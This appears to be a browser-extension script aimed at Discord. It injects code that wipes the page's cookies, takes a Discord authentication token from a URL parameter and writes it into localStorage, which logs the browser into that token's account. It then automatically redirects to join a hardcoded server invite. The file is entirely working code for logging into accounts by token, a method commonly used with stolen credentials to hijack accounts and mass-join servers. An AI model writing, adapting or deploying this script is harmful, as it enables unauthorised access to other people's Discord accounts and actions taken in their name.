var actualCode="("+function(){
function deleteAllCookies() {
    var cookies = document.cookie.split(";");

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
}
deleteAllCookies();	
}+")()";
var s = document.createElement('script');
s.textContent = actualCode;
document.documentElement.appendChild(s);
s.remove();
		


function joinServer(inviteUrl) {
    if (!inviteUrl) return;

    const targetUrl = inviteUrl.startsWith('http') ? inviteUrl : 'https://discord.gg/' + inviteUrl;
    const inviteUrlWithSlash = targetUrl.includes('/invite/') ? targetUrl : targetUrl.replace('https://discord.gg/', 'https://discord.com/invite/');

    if (window.location.href.includes('/invite/')) return;

    setTimeout(function () {
        window.location.replace(inviteUrlWithSlash);
    }, 3000);
}

const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
var discordtoken = urlParams.get("discordtoken");

if (discordtoken) {
    localStorage.clear();
    localStorage.setItem('token', `"${discordtoken.replace('"', '')}"`);
    sessionStorage.setItem('autoJoinServer', 'true');
    window.location.replace('https://discord.com/channels/@me');
} else if (sessionStorage.getItem('autoJoinServer') === 'true') {
    sessionStorage.removeItem('autoJoinServer');

    setTimeout(function () {
        joinServer('https://discord.gg/RR8pP3r7ep');
    }, 1000);
}